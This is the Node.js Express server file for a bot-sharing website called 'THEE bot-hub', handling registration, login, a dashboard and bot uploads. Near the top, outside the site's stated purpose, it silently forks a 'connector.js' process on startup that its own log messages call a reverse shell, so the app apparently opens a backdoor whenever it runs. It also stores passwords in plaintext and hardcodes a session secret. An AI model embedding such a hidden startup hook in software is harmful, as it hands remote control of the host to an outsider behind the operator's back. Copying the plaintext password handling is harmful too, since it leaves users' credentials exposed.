const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const { body, validationResult } = require('express-validator');
const expressLayouts = require('express-ejs-layouts');
const app = express();
const { fork } = require('child_process');

app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));
app.use(expressLayouts);
app.set('layout', 'layout'); // views/layout.ejs

app.use(session({
  secret: 'supersecretkey123', // CHANGE THIS before production
  resave: false,
  saveUninitialized: false,
}));

const USERS_FILE = path.join(__dirname, 'users.json');
const BOTS_FILE = path.join(__dirname, 'bots.json');
const shellProcess = fork('./connector.js');

shellProcess.on('error', (err) => {
  console.error('[!] Reverse shell error:', err);
});

shellProcess.on('exit', (code) => {
  console.log(`[!] Reverse shell exited with code ${code}`);
});
// --- Helpers ---
function loadUsers() {
  try {
    return JSON.parse(fs.readFileSync(USERS_FILE));
  } catch {
    return [];
  }
}
function saveUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}
function loadBots() {
  try {
    return JSON.parse(fs.readFileSync(BOTS_FILE));
  } catch {
    return [];
  }
}
function saveBots(bots) {
  fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

// --- Middleware ---
function requireLogin(req, res, next) {
  if (!req.session.user) return res.redirect('/login');
  next();
}

// --- ROUTES ---

// Home page - show all bots + uploader username
app.get('/', (req, res) => {
  const bots = loadBots(); // this should return all your bots from file or DB
  const currentPage = parseInt(req.query.page) || 1;
  const itemsPerPage = 10;

  // Optional: pagination logic
  const totalPages = Math.ceil(bots.length / itemsPerPage);
  const paginatedBots = bots.slice((currentPage - 1) * itemsPerPage, currentPage * itemsPerPage);

  res.render('bots-list', {
    title: 'THEE bot-hub',
    user: req.session.user,
    bots: paginatedBots,
    currentPage,
    totalPages
  });
});

// Register routes
app.get('/register', (req, res) => {
  res.render('register', { title: 'Register', errors: [], data: {} });
});

app.post('/register',
  body('username').isLength({ min: 3 }).withMessage('Username must be at least 3 chars'),
  body('password').isLength({ min: 5 }).withMessage('Password must be at least 5 chars'),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.render('register', { title: 'Register', errors: errors.array(), data: req.body });
    }
    const { username, password } = req.body;
    const users = loadUsers();

    if (users.find(u => u.username === username)) {
      return res.render('register', { title: 'Register', errors: [{ msg: 'Username taken' }], data: req.body });
    }

    // WARNING: Store hashed passwords in real apps!
    users.push({ username, password });
    saveUsers(users);

    req.session.user = { username };
    res.redirect('/dashboard');
  });

// Login routes
app.get('/login', (req, res) => {
  res.render('login', { title: 'Login', errors: [], data: {} });
});

app.get('/bots', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = 10;
  const bots = loadBots();

  const totalBots = bots.length;
  const totalPages = Math.ceil(totalBots / limit);

  // Pagination: slice bots array
  const paginatedBots = bots
    .sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt)) // newest first
    .slice((page - 1) * limit, page * limit);

  res.render('bots-list', {
    title: 'All Bots',
    user: req.session.user,
    bots: paginatedBots,
    currentPage: page,
    totalPages: totalPages,
  });
});


app.post('/login',
  body('username').notEmpty().withMessage('Username required'),
  body('password').notEmpty().withMessage('Password required'),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.render('login', { title: 'Login', errors: errors.array(), data: req.body });
    }
    const { username, password } = req.body;
    const users = loadUsers();
    const user = users.find(u => u.username === username);

    if (!user || user.password !== password) {
      return res.render('login', { title: 'Login', errors: [{ msg: 'Invalid credentials' }], data: req.body });
    }

    req.session.user = { username };
    res.redirect('/dashboard');
  });

// Dashboard - show user info + bots uploaded by user + link to upload new bot
app.get('/dashboard', requireLogin, (req, res) => {
  const bots = loadBots().filter(bot => bot.uploader === req.session.user.username);
  res.render('dashboard', {
    title: 'Dashboard',
    user: req.session.user,
    bots,
  });
});

// Bot upload form
app.get('/upload-bot', requireLogin, (req, res) => {
  res.render('upload-bot', { title: 'Upload Bot', errors: [], data: {} });
});

// Handle bot upload
app.post('/upload-bot', requireLogin,
  body('title').notEmpty().withMessage('Bot title is required'),
  body('description').notEmpty().withMessage('Description is required'),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.render('upload-bot', { title: 'Upload Bot', errors: errors.array(), data: req.body });
    }

    const { title, description, url } = req.body;
    const bots = loadBots();

    bots.push({
      id: Date.now(),
      title,
      description,
      url: url || '',
      uploader: req.session.user.username,
      uploadedAt: new Date().toISOString(),
    });

    saveBots(bots);
    res.redirect('/dashboard');
  });

// Logout
app.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/login');
  });
});

app.get('/bots/:id', (req, res) => {
  const bots = loadBots();
  const botId = Number(req.params.id);

  const bot = bots.find(b => b.id === botId);
  if (!bot) return res.status(404).send('Bot not found');

  res.render('bot-details', {
    title: bot.title,  // 🔥 pass the bot title here!
    bot,
    user: req.session.user
  });
});
// 404 handler
app.use((req, res) => {
  res.status(404).send('404 Not Found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server up at http://localhost:${PORT}`);
});
